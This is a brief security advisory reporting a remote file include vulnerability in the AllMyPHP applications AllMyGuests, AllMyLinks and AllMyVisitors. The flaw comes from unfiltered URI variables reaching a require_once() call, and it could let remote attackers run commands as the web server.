Reportedly the AllMyPHP applications AllMyGuests, AllMyLinks and AllMyVisitors are prone to a remote file include vulnerability. The issue is due to insufficient filtering of URI passed variables that are used in a 'require_once()' call.

This issue may allow a remote attacker to execute arbitrary commands on the affected system with the privileges of the web server. Other attacks may be possible as well.
